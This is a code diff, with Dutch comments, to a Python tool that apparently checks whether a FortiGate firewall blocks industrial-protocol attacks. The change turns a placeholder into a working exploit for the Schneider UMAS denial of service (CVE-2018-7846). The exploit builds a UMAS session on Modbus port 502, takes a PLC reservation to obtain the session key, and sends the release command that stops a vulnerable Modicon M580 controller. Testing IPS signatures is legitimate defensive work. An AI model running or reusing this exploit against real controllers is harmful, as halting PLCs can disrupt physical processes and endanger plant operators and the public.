@@ -143,34 +143,41 @@ def cmd_modbus_forcelisten(ip):
         s.close()
 
 
+def _umas(key, fc, data=b""):
+    """Bouw een UMAS-frame: MBAP + Modbus FC 0x5A + session key + UMAS-functie + data."""
+    pdu = bytes([0x5A, key, fc]) + data
+    return b"\x00\x01\x00\x00" + (1 + len(pdu)).to_bytes(2, "big") + b"\x00" + pdu
+
+
+def _send(s, frame, to=3):
+    s.sendall(frame)
+    s.settimeout(to)
+    try:
+        return s.recv(256)
+    except socket.timeout:
+        return b""
+
+
 def cmd_umas_dos(ip):
-    """Schneider UMAS-commando over Modbus (function code 0x5A) richting een
-    Modicon M580. De probe doet eerst een normale read zodat de FortiGate de
-    sessie herkent, en stuurt dan het UMAS-frame dat hoort bij de M580 UMAS-DoS
-    (CVE-2018-7846): een read-only PLC zou dit moeten weigeren, een kwetsbare M580
-    valt erdoor stil. Een FortiGate met de virtual-patch-signature dropt het frame."""
-    read = bytes.fromhex("000100000006010300000001")  # FC03: HR0, 1 register
-    # MBAP(txn,proto,len=5,unit) + FC 0x5A (UMAS) + pairing key 0x00 + UMAS-functie 0x11 + data
-    umas = bytes.fromhex("000100000005005A001100")
+    """Schneider UMAS-DoS (CVE-2018-7846) tegen een Modicon M580, over Modbus
+    (function code 0x5A). De probe zet een echte UMAS-sessie op -- INIT_COMM (0x01)
+    en TAKE_PLC_RESERVATION (0x10), waaruit een session key komt -- zodat de FortiGate
+    het verkeer als UMAS herkent, en stuurt dan de DoS: RELEASE_PLC_RESERVATION (0x11)
+    met die key. Een kwetsbare M580 valt erdoor stil; een FortiGate met de
+    virtual-patch-signature dropt het frame."""
+    read = bytes.fromhex("000100000006010300000001")  # FC03: HR0, 1 register (voor classificatie)
     try:
         s = socket.create_connection((ip, 502), timeout=5)
     except OSError as e:
         out(False, f"{ip}:502 niet bereikbaar - {e}")
     try:
-        s.sendall(read)
-        s.settimeout(3)
-        try:
-            s.recv(64)
-        except socket.timeout:
-            pass
-        s.sendall(umas)
-        s.settimeout(3)
-        try:
-            data = s.recv(64)
-        except socket.timeout:
-            out(True, f"UMAS-frame afgeleverd bij {ip}:502 (geen antwoord)")
-        out(True, f"UMAS-frame afgeleverd bij {ip}:502"
-                  + (f" (antwoord {data.hex()})" if data else " (sessie gesloten)"))
+        _send(s, read)                          # normale Modbus-read
+        _send(s, _umas(0x00, 0x01))             # INIT_COMM
+        res = _send(s, _umas(0x00, 0x10))       # TAKE_PLC_RESERVATION
+        key = res[-1] if res else 0x00          # session key uit het reservation-antwoord
+        dos = _send(s, _umas(key, 0x11, b"\x00"))  # RELEASE_PLC_RESERVATION -> DoS
+        out(True, f"UMAS-DoS afgeleverd bij {ip}:502 (session key {key}"
+                  + (f", antwoord {dos.hex()}" if dos else ", geen antwoord") + ")")
     except (ConnectionResetError, BrokenPipeError, OSError) as e:
         out(False, f"{ip}:502 - sessie gedropt/gereset (IPS?): {e}")
     finally:
